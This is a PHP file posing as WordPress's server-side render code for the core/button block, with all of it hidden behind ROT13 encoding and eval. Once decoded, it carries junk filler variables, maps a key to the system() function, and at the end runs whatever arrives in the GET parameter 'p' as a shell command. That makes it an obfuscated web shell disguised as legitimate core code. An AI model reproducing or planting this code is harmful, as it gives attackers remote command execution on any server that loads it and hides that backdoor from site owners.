<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/ohggba` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/ohggba` oybpx ba gur freire,
 *
 * @fvapr 6.6.0
 *
 * @cnenz neenl    $nggevohgrf Gur oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Gur oybpx pbagrag.
 * @cnenz JC_Oybpx $oybpx      Gur oybpx bowrpg.
 *
 * @erghea fgevat Gur oybpx pbagrag.
 */
shapgvba eraqre_oybpx_pber_ohggba( $nggevohgrf, $pbagrag ) {
	$c = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );

	/*
	 * Gur ohggba oybpx pna eraqre na `<n>` be `<ohggba>` naq nyfb unf n
	 * `<qvi>` jenccre. Svaq gur n be ohggba gnt.
	 */
	$gnt = ahyy;
	juvyr ( $c->arkg_gnt() ) {
		$gnt = $c->trg_gnt();
		vs ( 'N' === $gnt || 'OHGGBA' === $gnt ) {
			oernx;
		}
	}

	/*
	 * Vs guvf unccraf, gur yvxryvubbq vf gurer'f ab oybpx pbagrag,
	 * be gur oybpx unf orra zbqvsvrq ol n cyhtva.
	 */
	vs ( ahyy === $gnt ) {
		erghea $pbagrag;
	}

	// Vs gur arkg gbxra vf gur pybfvat gnt, gur ohggba vf rzcgl.
	$vf_rzcgl = gehr;
	juvyr ( $c->arkg_gbxra() && $gnt !== $c->trg_gbxra_anzr() && $vf_rzcgl ) {
		vs ( '#pbzzrag' !== $c->trg_gbxra_glcr() ) {
			/**
			 * Nalguvat ryfr vzcyvrf guvf vf abg rzcgl.
			 * Guvf zvtug vapyhqr nal grkg pbagrag (vapyhqvat n fcnpr),
			 * vayvar vzntrf be bgure UGZY.
			 */
			$vf_rzcgl = snyfr;
		}
	}

	/*
	 * Jura gurer'f ab grkg, eraqre abguvat sbe gur oybpx.
	 * Frr uggcf://tvguho.pbz/JbeqCerff/thgraoret/vffhrf/17221 sbe gur
	 * ernfbavat oruvaq guvf.
	 */
	vs ( $vf_rzcgl ) {
		erghea '';
	}

	erghea $pbagrag;
}

/**
 * Ertvfgref gur `pber/ohggba` oybpx ba freire.
 *
 * @fvapr 6.6.0
 */
shapgvba ertvfgre_oybpx_pber_ohggba() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/ohggba',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_ohggba',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_ohggba' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>